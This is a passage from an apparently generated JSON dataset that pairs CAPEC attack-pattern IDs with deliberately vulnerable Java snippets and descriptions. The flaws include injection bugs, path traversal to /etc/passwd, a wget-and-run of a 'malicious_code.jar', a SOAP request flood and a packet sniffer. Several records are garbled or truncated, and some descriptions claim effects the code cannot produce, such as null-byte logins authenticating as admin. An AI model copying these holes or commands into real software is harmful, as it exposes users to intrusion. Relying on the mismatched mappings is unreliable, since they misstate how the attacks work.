        "code_snippet": "public class EmailHeaderManipulation {\n    public static void sendEmail(String from, String to, String subject, String body) {\n        String emailHeader = \"From: \" + from + \"\\r\\n\";\n        emailHeader += \"To: \" + to + \"\\r\\n\";\n        emailHeader += \"Subject: \" + subject + \"\\r\\n\";\n        emailHeader += \"\\r\\n\";\n        emailHeader += body;\n\n        // Send the email using a vulnerable method\n        sendEmailOverNetwork(emailHeader);\n    }\n\n    private static void sendEmailOverNetwork(String emailHeader) {\n        // Assume this method sends the email over the network\n        // without properly sanitizing the input\n        Socket socket = new Socket(\"mailserver\", 25);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(emailHeader);\n        out.close();\n        socket.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates email header manipulation by injecting data via delimiter characters native to the protocol. The `sendEmail` method constructs an email header using user-input data without proper sanitization, allowing an attacker to inject malicious data, such as CR and LF characters, which can be used to inject arbitrary email headers or even execute commands on the mail server. This code is vulnerable to CWE-150, CWE-116, CWE-147, CWE-113, and CWE-77."
    },
    {
        "capec_id": "135",
        "code_snippet": "import java.util.Scanner;\npublic class FormatStringVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your name: \");\n        String userInput = scanner.next();\n        System.out.printf(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a format string vulnerability. The program takes user input and uses it as a format string for printf, allowing an attacker to inject format specifiers and potentially read or write to memory locations, leading to code execution or crashes."
    },
    {
        "capec_id": "136",
        "code_snippet": "import javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport java.util.Hashtable;\n\npublic class LDAPInjection {\n    public static void main(String[] args) {\n        String username = args[0];\n        String ldapQuery = \"(uid=\" + username + \")\";\n        Hashtable env = new Hashtable();\n        env.put(javax.naming.Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(javax.naming.Context.PROVIDER_URL, \"ldap://localhost:389/dc=example,dc=com\");\n        DirContext ctx = new InitialDirContext(env);\n        ctx.search(\"dc=example,dc=com\", ldapQuery);\n    }\n}\n",
        "description": "This Java code snippet is vulnerable to LDAP injection. It takes a username as input and constructs an LDAP query using that input. An attacker could inject malicious input, such as '*', to retrieve information about all users on the system. This code is vulnerable to CWE-90 (Improper Neutralization of Special Elements used in an LDAP Query) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "137",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        String query = \"SELECT * FROM users WHERE name = '\" + userInput + \"'\";\n        String url = \"http://example.com/search?\" + query;\n        URL obj = new URL(url);\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n        con.setRequestMethod(\"GET\");\n        int responseCode = con.getResponseCode();\n        if (responseCode == 200) {\n            System.out.println(\"Search query executed successfully\");\n        } else {\n            System.out.println(\"Error executing search query\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to HTTP parameter pollution and command injection attacks. The servlet takes user input from a GET request parameter and uses it to construct a SQL query and an HTTP GET request URL without proper encoding or escaping. An attacker can inject special characters, such as ampersands, to add or modify parameters in the URL, potentially leading to unauthorized access or data tampering."
    },
    {
        "capec_id": "138",
        "code_snippet": "public class VulnerableReflection {\n    public static void invokeMethod(String className, String methodName, String args) throws Exception {\n        Class<?> clazz = Class.forName(className);\n        Object obj = clazz.newInstance();\n        Method method = clazz.getMethod(methodName, String.class);\n        method.invoke(obj, args);\n    }\n\n    public static void main(String[] args) throws Exception {\n        String userInput = \"java.lang.Runtime\";\n        String methodName = \"getRuntime\";\n        String args = \"\";\n        invokeMethod(userInput, methodName, args);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of using externally-controlled input to select classes or code ('Unsafe Reflection'). The 'invokeMethod' function uses user-input to select a class, method, and arguments, which can lead to the invocation of arbitrary methods, including those that can be used for malicious purposes. This code is vulnerable to CWE-470, CWE-301, CWE-77, CWE-74, and CWE-94."
    },
    {
        "capec_id": "139",
        "code_snippet": "public class FileAccessor {\n    public static void accessFile(String filePath) {\n        try {\n            File file = new File(filePath);\n            if (file.exists()) {\n                System.out.println(\"File found: \" + file.getAbsolutePath());\n                // Perform file operations\n            } else {\n                System.out.println(\"File not found\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error accessing file: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        String userInput = \"../../../../../../../../etc/passwd\";\n        accessFile(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a path traversal vulnerability. The `accessFile` method takes a file path as input and attempts to access the corresponding file. The `main` method provides a malicious user input that exploits the vulnerability by traversing up the directory hierarchy using `../` sequences to access a sensitive file (`/etc/passwd`) outside of the intended directory."
    },
    {
        "capec_id": "140",
        "code_snippet": "public class FormController {\n    private int currentState = 1;\n    private Map<String, String> formData = new HashMap<>();\n\n    public void processForm(HttpServletRequest request) {\n        String formName = request.getParameter(\"formName\");\n        if (formName.equals(\"form1\")) {\n            currentState = 2;\n            formData.put(\"field1\", request.getParameter(\"field1\"));\n        } else if (formName.equals(\"form2\")) {\n            // Assume current state is 2 and form1 data is already collected\n            currentState = 3;\n            formData.put(\"field2\", request.getParameter(\"field2\"));\n        } else if (formName.equals(\"form3\")) {\n            // Assume current state is 3 and form1, form2 data is already collected\n            currentState = 4;\n            formData.put(\"field3\", request.getParameter(\"field3\"));\n        }\n        // ... other form processing logic\n    }\n\n    public void submitData() {\n        if (currentState == 4) {\n            // Process complete form data\n            System.out.println(\"Form data: \" + formData);\n        } else {\n            System.out.println(\"Incomplete form data\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable form controller that allows an attacker to bypass the sequential form submission process. The controller uses a hidden field 'formName' to determine the current state of the form submission process. However, an attacker can manipulate the 'formName' parameter to jump to any form in the sequence, potentially leading to incomplete or incorrect data collection. This code embodies CWE-372 (Incomplete Internal State Distinction), CWE-472 (External Control of Assumed-Immutable Web Parameter), CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), and CWE-352 (Cross-Site Request Forgery)."
    },
    {
        "capec_id": "141",
        "code_snippet": "public class CacheExploit {\n    private Cache cache;\n    \n    public CacheExploit() {\n        cache = new Cache();\n    }\n    \n    public void putData(String key, String data) {\n        cache.put(key, data);\n    }\n    \n    public String getData(String key) {\n        return cache.get(key);\n    }\n    \n    public static void main(String[] args) {\n        CacheExploit cacheExploit = new CacheExploit();\n        \n        // CWE-348: Using less trusted source\n        String untrustedData = getUntrustedDataFromSource();\n        cacheExploit.putData(\"key\", untrustedData);\n        \n        // CWE-345: Insufficient verification of data authenticity\n        String data = cacheExploit.getData(\"key\");\n        if (data != null) {\n            // Use the data without verifying its authenticity\n            System.out.println(\"Received data: \" + data);\n        }\n        \n        // CWE-349: Acceptance of extraneous untrusted data with trusted data\n        String trustedData = getTrustedData();\n        String untrustedDataWithTrustedData = trustedData + \",\" + getUntrustedData();\n        cacheExploit.putData(\"key\", untrustedDataWithTrustedData);\n        \n        // CWE-346: Origin validation error\n        String dataFromUntrustedSource = cacheExploit.getData(\"key\");\n        if (dataFromUntrustedSource != null) {\n            // Use the data without verifying its origin\n            System.out.println(\"Received data from untrusted source: \" + dataFromUntrustedSource);\n        }\n        \n        // CWE-524: Use of cache containing sensitive information\n        String sensitiveData = cacheExploit.getData(\"sensitiveKey\");\n        if (sensitiveData != null) {\n            // Use the sensitive data without proper access control\n            System.out.println(\"Received sensitive data: \" + sensitiveData);\n        }\n    }\n    \n    private static String getUntrustedDataFromSource() {\n        // Return untrusted data from an untrusted source\n        return \"Untrusted data\";\n    }\n    \n    private static String getTrustedData() {\n        // Return trusted data from a trusted source\n        return \"Trusted data\";\n    }\n    \n    private static String getUntrustedData() {\n        // Return untrusted data\n        return \"Untrusted data\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates a cache exploit where an attacker can place incorrect or harmful material in the cache, which can lead to a wide range of exploits. The code uses a cache that contains sensitive information, but the cache can be read by an actor outside of the intended control sphere (CWE-524). The code also uses less trusted sources of data (CWE-348), does not sufficiently verify the origin or authenticity of data (CWE-345 and CWE-346), and accepts extraneous untrusted data with trusted data (CWE-349)."
    },
    {
        "capec_id": "142",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class DNSCachePoisoning {\n    public static void main(String[] args) {\n        String domainName = \\",
        "description": "This Java code snippet demonstrates a DNS cache poisoning attack, where an adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses. The code uses a less trusted DNS cache source (CWE-348) and does not properly verify the origin or authenticity of the DNS data (CWE-345). It also accepts extraneous untrusted data with trusted data (CWE-349) and relies on reverse DNS resolution for a security-critical action (CWE-350). The code resolves a domain name to an IP address using the tampered DNS cache, and then makes a security decision based on the resolved address, which can lead to a security breach."
    },
    {
        "capec_id": "143",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        // CWE-219: Storage of File with Sensitive Data Under Web Root\n        File sensitiveFile = new File(\"/var/www/html/sensitive_data.txt\");\n        if (sensitiveFile.exists()) {\n            System.out.println(\"Sensitive data found!\");\n        }\n\n        // CWE-494: Download of Code Without Integrity Check\n        String url = \"https://example.com/malicious_code.jar\";\n        try {\n            // Download and execute the code without verifying its origin and integrity\n            Runtime.getRuntime().exec(\"wget \" + url + \" && java -jar malicious_code.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-612: Improper Authorization of Index Containing Sensitive Information\n        List<String> searchIndex = new ArrayList<>();\n        searchIndex.add(\"/private/documents/confidential.pdf\");\n        searchIndex.add(\"/private/documents/top_secret.docx\");\n        // Make the search index accessible to unauthorized actors\n        System.out.println(\"Search index: \" + searchIndex);\n\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        File repoDir = new File(\"/var/www/html/.git\");\n        if (repoDir.exists()) {\n            System.out.println(\"Git repository found!\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC 'An adversary searches a targeted web site for web pages that have not been publicized' by showcasing multiple CWEs. It includes CWE-219 by storing sensitive data under the web root, CWE-494 by downloading and executing code without verifying its origin and integrity, CWE-612 by creating a search index of private documents without proper authorization, and CWE-527 by exposing a version-control repository to unauthorized actors."
    },
    {
        "capec_id": "144",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URL;\nimport javax.xml.ws.Service;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        // CWE-651: Exposure of WSDL File Containing Sensitive Information\n        URL wsdlURL = new URL(\"http://example.com/webservice?wsdl\");\n        Service service = Service.create(wsdlURL, new QName(\"http://example.com/webservice\", \"MyService\"));\n        System.out.println(service.getWSDLDocumentLocation());\n\n        // CWE-494: Download of Code Without Integrity Check\n        URL codeURL = new URL(\"http://example.com/downloadcode\");\n        File downloadedCode = new File(\"downloaded_code.java\");\n        FileUtils.copyURLToFile(codeURL, downloadedCode);\n        Runtime.getRuntime().exec(\"javac downloaded_code.java\");\n\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        File repoDir = new File(\".git\");\n        if (repoDir.isDirectory()) {\n            System.out.println(\"Repository found: \" + repoDir.getAbsolutePath());\n        }\n\n        // CWE-425: Direct Request ('Forced Browsing')\n        String restrictedURL = \"http://example.com/adminpanel\";\n        URL restrictedUrlObj = new URL(restrictedURL);\n        HttpURLConnection conn = (HttpURLConnection) restrictedUrlObj.openConnection();\n        conn.setRequestMethod(\"GET\");\n        int responseCode = conn.getResponseCode();\n        System.out.println(\"Response Code: \" + responseCode);\n\n        // CWE-223: Omission of Security-relevant Information\n        System.out.println(\"No security logging or auditing implemented.\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of searching for unpublished web services and exploiting them. It includes vulnerabilities such as exposing WSDL files, downloading code without integrity checks, exposing version control repositories, allowing direct requests to restricted URLs, and omitting security-relevant information."
    },
    {
        "capec_id": "145",
        "code_snippet": "public class ChecksumSpoofing {\n    public static void main(String[] args) {\n        String originalMessage = \"This is the original message\";\n        String modifiedMessage = \"This is the modified message\";\n\n        // CWE-354: Improper Validation of Integrity Check Value\n        // Using a weak hash function (MD5) that can be easily tampered with\n        String originalChecksum = getMD5Checksum(originalMessage);\n        String modifiedChecksum = getMD5Checksum(modifiedMessage);\n\n        // CWE-328: Use of Weak Hash\n        // Using a weak hash function (MD5) that can be easily tampered with\n        System.out.println(\"Original Checksum: \" + originalChecksum);\n        System.out.println(\"Modified Checksum: \" + modifiedChecksum);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // Not validating the integrity of the message during transmission\n        sendModifiedMessage(modifiedMessage, modifiedChecksum);\n    }\n\n    public static String getMD5Checksum(String message) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] bytes = md.digest(message.getBytes());\n            StringBuilder checksum = new StringBuilder();\n            for (byte b : bytes) {\n                checksum.append(String.format(\"%02x\", b));\n            }\n            return checksum.toString();\n        } catch (NoSuchAlgorithmException e) {\n            return \"\";\n        }\n    }\n\n    public static void sendModifiedMessage(String message, String checksum) {\n        // CWE-353: Missing Support for Integrity Check\n        // Not verifying the integrity of the message during transmission\n        System.out.println(\"Sending modified message: \" + message + \" with checksum: \" + checksum);\n    }\n}",
        "description": "This code snippet demonstrates the concept of checksum spoofing, where an adversary modifies a message and its corresponding checksum to make it appear valid. The code uses a weak hash function (MD5) that can be easily tampered with, and does not properly validate the integrity of the message during transmission. The CWEs embodied in this code snippet include CWE-354, CWE-328, CWE-924, and CWE-353."
    },
    {
        "capec_id": "146",
        "code_snippet": "import javax.xml.XMLConstants; import javax.xml.transform.stream.StreamSource; import javax.xml.validation.Schema; import javax.xml.validation.SchemaFactory; import javax.xml.validation.Validator; import java.io.StringReader; public class SchemaPoisoning { public static void main(String[] args) throws Exception { String xmlSchema = \"<?xml version=\\\"1.0\\\"?><xs:schema xmlns:xs=\\\"http://www.w3.org/2001/XMLSchema\\\"><xs:element name=\\\"user\\\"><xs:complexType><xs:sequence><xs:element name=\\\"username\\\" type=\\\"xs:string\\\"/></xs:sequence></xs:complexType></xs:element></xs:schema>\"; String xmlData = \"<?xml version=\\\"1.0\\\"?><user><username>attacker</username></user>\"; // CWE-15: External Control of System or Configuration Setting String externalSchema = getExternalSchema(); // CWE-472: External Control of Assumed-Immutable Web Parameter if (externalSchema != null) { xmlSchema = externalSchema; } // CWE-112: Missing XML Validation SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI); Schema schema = factory.newSchema(new StreamSource(new StringReader(xmlSchema))); Validator validator = schema.newValidator(); validator.validate(new StreamSource(new StringReader(xmlData))); } private static String getExternalSchema() { // CWE-91: XML Injection (aka Blind XPath Injection) // CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection') return \"<?xml version=\\\"1.0\\\"?><xs:schema xmlns:xs=\\\"http://www.w3.org/2001/XMLSchema\\\"><xs:element name=\\\"user\\\"><xs:complexType><xs:sequence><xs:element name=\\\"username\\\" type=\\\"xs:string\\\"/></xs:sequence></xs:complexType></xs:element></xs:schema>\"; } }",
        "description": "This Java code snippet demonstrates the CAPEC of schema poisoning, where an adversary corrupts or modifies the content of XML schema information passed between a client and server. The code allows external control of the XML schema, which can lead to security vulnerabilities. It includes CWE-15, CWE-472, CWE-112, CWE-91, and CWE-643, making it vulnerable to schema poisoning attacks."
    },
    {
        "capec_id": "147",
        "code_snippet": "import java.io.IOException;\nimport java.net.URL;\nimport javax.xml.soap.SOAPConnection;\nimport javax.xml.soap.SOAPConnectionFactory;\nimport javax.xml.soap.SOAPException;\n\npublic class SOAPFlood {\n    public static void main(String[] args) {\n        try {\n            SOAPConnectionFactory factory = SOAPConnectionFactory.newInstance();\n            SOAPConnection connection = factory.createConnection();\n\n            for (int i = 0; i < 100000; i++) {\n                URL endpoint = new URL(\"http://target-system.com/soap/endpoint\");\n                String request = \"<?xml version=\\\"1.0\\\"?><soap:Envelope xmlns:soap=\\\"http://www.w3.org/2003/05/soap-envelope/\\\"><soap:Body><m:placeOrder xmlns:m=\\\"http://target-system.com/soap/endpoint\\\"><m:order><m:customerID>123</m:customerID><m:itemID>123</m:itemID><m:quantity>1</m:quantity></m:order></m:placeOrder></soap:Body></soap:Envelope>\";\n                connection.call(new javax.xml.soap.SOAPMessageFactory.newInstance().createMessage(null, new java.io.ByteArrayInputStream(request.getBytes())), endpoint);\n            }\n        } catch (SOAPException | IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP flooding attack, which is a type of resource depletion attack. The code creates a large number of SOAP requests to a target system, depleting its resources and potentially causing a denial of service or crash. The code does not validate the XML schema, does not throttle the allocation of resources, and transmits sensitive information in cleartext, making it vulnerable to CWE-112, CWE-770, CWE-941, and CWE-319 respectively."
    },
    {
        "capec_id": "148",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class SpoofedContentServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userAgent = req.getHeader(\"User-Agent\");\n        String spoofedContent = \"<html><body><h1>Welcome, \" + userAgent + \"!</h1></body></html>\";\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        out.println(spoofedContent);\n        out.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates content spoofing by modifying the content of an HTTP response based on the User-Agent header. The servlet does not verify the authenticity of the request or the data being sent, making it vulnerable to CWE-345. The code also does not ensure the integrity of the message during transmission, which is CWE-924. Additionally, the servlet delivers unparsed raw web content, which is CWE-433. Furthermore, the code does not verify whether the request was intentionally provided by the user, making it vulnerable to CWE-352. Finally, the servlet does not correctly specify the intended destination for the response, which is CWE-941. This code can be used to spoof content and lead to unwanted outcomes such as malware exposure, financial fraud, and privacy violations."
    },
    {
        "capec_id": "149",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.UUID;\n\npublic class PredictableTempFile {\n    public static void main(String[] args) {\n        String tempDir = System.getProperty(\"java.io.tmpdir\");\n        String tempFileName = \"temp\" + UUID.randomUUID().toString().substring(0, 4) + \".txt\";\n        File tempFile = new File(tempDir, tempFileName);\n        try {\n            tempFile.createNewFile();\n            // Perform some operations on the temporary file\n            System.out.println(\"Temporary file created: \" + tempFile.getAbsolutePath());\n        } catch (IOException e) {\n            System.out.println(\"Error creating temporary file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation of a predictable temporary file, which can be exploited by an attacker to launch further attacks. The temporary file name is generated using a UUID, but the substring of the UUID is fixed, making it predictable. The file is created in the system's temporary directory with default permissions, making it vulnerable to unauthorized access. This code embodies CWE-377, CWE-378, CWE-379, CWE-73, and CWE-41."
    },
    {
        "capec_id": "150",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        // CWE-552: Files or Directories Accessible to External Parties\n        File config = new File(\"/etc/config.txt\");\n        if (config.exists()) {\n            try {\n                // CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\n                String debugInfo = System.getProperty(\"debug.info\");\n                System.out.println(debugInfo);\n            } catch (Exception e) {\n                // CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n                System.out.println(\"Error: \" + e.getMessage());\n            }\n        }\n\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        String traceData = getTraceDataFromSoC();\n        writeTraceDataToFile(traceData, \"/unprotected/location/trace_data.txt\");\n\n        // CWE-1330: Remanent Data Readable after Memory Erase\n        byte[] sensitiveData = new byte[1024];\n        // Initialize sensitiveData with confidential information\n        // ...\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        // No scrubbing or improper scrubbing of sensitiveData\n        // ...\n    }\n\n    private static String getTraceDataFromSoC() {\n        // Return trace data collected from several sources on the System-on-Chip (SoC)\n        return \"trace_data_collected_from_SoC\";\n    }\n\n    private static void writeTraceDataToFile(String traceData, String filePath) {\n        try {\n            // Write trace data to an unprotected location\n            File file = new File(filePath);\n            file.createNewFile();\n            // Write traceData to file\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting well-known locations for resources to undermine security. It includes CWEs such as files or directories accessible to external parties, exposure of sensitive system information, improper management of sensitive trace data, remanent data readable after memory erase, and improper scrubbing of sensitive data from decommissioned devices."
    },
    {
        "capec_id": "151",
        "code_snippet": "public class AuthenticationSystem {\n    private Map<String, String> users = new HashMap<>();\n\n    public AuthenticationSystem() {\n        users.put(\"admin\", \"password123\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            return true;\n        }\n        return false;\n    }\n\n    public void performAction(String username) {\n        if (authenticate(username, \"password123\")) {\n            System.out.println(\"Authenticated as \" + username);\n            // Perform sensitive action\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationSystem system = new AuthenticationSystem();\n        system.performAction(\"admin\"); // Authenticates successfully\n\n        // CWE-287: Improper Authentication\n        system.performAction(\"hacker\" + \"\\u0000\" + \"admin\"); // Authenticates as admin without knowing the password\n\n        // CWE-290: Authentication Bypass by Spoofing\n        system.performAction(\"admin\" + \"\\u0000\" + \"hacker\"); // Spoofs admin's identity\n\n        // CWE-1390: Weak Authentication\n        system.performAction(\"admin\" + \"\\u0020\" + \"hacker\"); // Weak authentication allows bypass\n\n        // CWE-322: Key Exchange without Entity Authentication\n        system.performAction(\"hacker\" + \"\\u0000\" + \"admin\" + \"\\u0000\" + \"key\"); // Key exchange without entity authentication\n\n        // CWE-302: Authentication Bypass by Assumed-Immutable Data\n        system.performAction(\"admin\" + \"\\u0000\" + \"hacker\" + \"\\u0000\" + \"immutable_data\"); // Bypasses authentication by modifying assumed-immutable data\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of Identity Spoofing, which involves assuming the identity of another entity to accomplish a goal. The code includes multiple vulnerabilities related to authentication, including CWE-287: Improper Authentication, CWE-290: Authentication Bypass by Spoofing, CWE-1390: Weak Authentication, CWE-322: Key Exchange without Entity Authentication, and CWE-302: Authentication Bypass by Assumed-Immutable Data. These vulnerabilities allow an attacker to spoof identities, bypass authentication, or exchange keys without proper entity authentication, ultimately leading to unauthorized access and potential security breaches."
    },
    {
        "capec_id": "153",
        "code_snippet": "public class VulnerableInputValidation {\n    public void processUserInput(String userInput) {\n        try {\n            // CWE-20: No input validation\n            int userInputAsInt = Integer.parseInt(userInput);\n            System.out.println(\"User input as integer: \" + userInputAsInt);\n\n            // CWE-1286: Improper validation of syntactic correctness of input\n            String userInputAsJson = \"{\\\"name\\\":\\\"\" + userInput + \"\\\"}\";\n            JSONParser parser = new JSONParser();\n            JSONObject jsonObject = (JSONObject) parser.parse(userInputAsJson);\n            System.out.println(\"User input as JSON: \" + jsonObject);\n\n            // CWE-1287: Improper validation of specified type of input\n            Object userInputAsObject = userInput;\n            if (userInputAsObject instanceof String) {\n                System.out.println(\"User input is a string\");\n            } else {\n                System.out.println(\"User input is not a string\");\n            }\n\n            // CWE-807: Reliance on untrusted inputs in a security decision\n            if (userInput.equals(\"admin\")) {\n                System.out.println(\"User is an admin\");\n            } else {\n                System.out.println(\"User is not an admin\");\n            }\n\n            // CWE-1173: Improper use of validation framework\n            // Using a custom validation method instead of a provided framework\n            if (isValidInput(userInput)) {\n                System.out.println(\"User input is valid\");\n            } else {\n                System.out.println(\"User input is not valid\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error processing user input: \" + e.getMessage());\n        }\n    }\n\n    private boolean isValidInput(String input) {\n        // Custom validation method with potential flaws\n        return input != null && input.length() > 0;\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in input validation. It includes examples of CWE-20 (improper input validation), CWE-1286 (improper validation of syntactic correctness of input), CWE-1287 (improper validation of specified type of input), CWE-807 (reliance on untrusted inputs in a security decision), and CWE-1173 (improper use of validation framework). The code lacks proper input validation, allowing an attacker to supply malicious input and potentially bypass security mechanisms."
    },
    {
        "capec_id": "154",
        "code_snippet": "public class SpoofedResourceRequest {\n    public static void main(String[] args) {\n        String userInput = \"https://example.com/maliciousResource\";\n        String trustedResource = \"https://trusted.example.com/resource\";\n\n        // CWE-451: Misrepresenting critical information to the user\n        System.out.println(\"You are accessing: \" + trustedResource);\n\n        // CWE-941: Incorrectly specified destination in a communication channel\n        URL url = new URL(userInput);\n        URLConnection conn = url.openConnection();\n\n        // CWE-290: Authentication bypass by spoofing\n        String authHeader = \"Basic \" + Base64.getEncoder().encodeToString(\"maliciousUser:password\".getBytes());\n        conn.setRequestProperty(\"Authorization\", authHeader);\n\n        // CWE-940: Improper verification of source of a communication channel\n        conn.connect();\n\n        // CWE-923: Improper restriction of communication channel to intended endpoints\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            System.out.println(inputLine);\n        }\n        in.close();\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of deceiving an application or user into requesting a resource from an unintended location. The code misrepresents critical information to the user, incorrectly specifies the destination in a communication channel, bypasses authentication by spoofing, improperly verifies the source of the communication channel, and improperly restricts the communication channel to intended endpoints. The code uses a malicious user-input URL, which is used to make a request to a spoofed resource, allowing an adversary to achieve their malicious goals."
    },
    {
        "capec_id": "155",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class InsecureTempFile {\n    public static void main(String[] args) {\n        try {\n            File tempFile = File.createTempFile(\"temp\", \".txt\");\n            tempFile.setReadable(true, false);\n            tempFile.setWritable(true, false);\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"username:password\");\n            writer.close();\n            System.out.println(\"Temporary file created at: \" + tempFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet creates a temporary file with insecure permissions, storing sensitive information (username and password) in a world-readable file. The file is created in the default temporary directory with default permissions, making it accessible to unintended actors."
    },
    {
        "capec_id": "157",
        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\n\npublic class SniffingAttack {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        Socket socket = serverSocket.accept();\n        DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());\n        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());\n\n        String sensitiveData = \\",
        "description": "This Java code snippet demonstrates a sniffing attack, where an adversary intercepts sensitive data transmitted between two parties. The code establishes a server socket and a client socket, and transmits sensitive data (username and password) in cleartext. The adversary then intercepts this data by creating a new socket connection to the server, highlighting the vulnerability of transmitting sensitive information without encryption (CWE-311, CWE-319). The code also touches on CWE-924, as it does not ensure the integrity of the message during transmission. Additionally, it relates to CWE-1300, as it does not protect against physical side channels, and CWE-514, as it does not prevent covert channels."
    },
    {
        "capec_id": "158",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class Sniffer {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(8888);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String data = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Captured packet: \" + data);\n        }\n    }\n}\n\n// Client-side code that sends sensitive information in cleartext\nimport java.net.*;\nimport java.io.*;\n\npublic class Client {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8888);\n        OutputStream outputStream = socket.getOutputStream();\n        String sensitiveData = \"username=password\";\n        outputStream.write(sensitiveData.getBytes());\n        outputStream.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a network sniffer that captures and prints sensitive information sent in cleartext by a client. The client code sends a username and password combination without encryption, making it vulnerable to capture and replay attacks. This code embodies the CAPEC of network sniffing and relates to CWEs 311, 319, 294, and 497."
    },
    {
        "capec_id": "159",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.System;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String libPath = System.getProperty(\"java.library.path\");\n        String[] pathElements = libPath.split(\":\");\n        String maliciousLibPath = \"/tmp/malicious_lib\";\n        String maliciousLibName = \"libmalicious.so\";\n\n        // CWE-426: Untrusted Search Path\n        System.setProperty(\"java.library.path\", maliciousLibPath);\n\n        try {\n            // CWE-73: External Control of File Name or Path\n            File maliciousLibFile = new File(maliciousLibPath, maliciousLibName);\n            if (!maliciousLibFile.exists()) {\n                maliciousLibFile.createNewFile();\n            }\n\n            // CWE-706: Use of Incorrectly-Resolved Name or Reference\n            System.load(maliciousLibFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
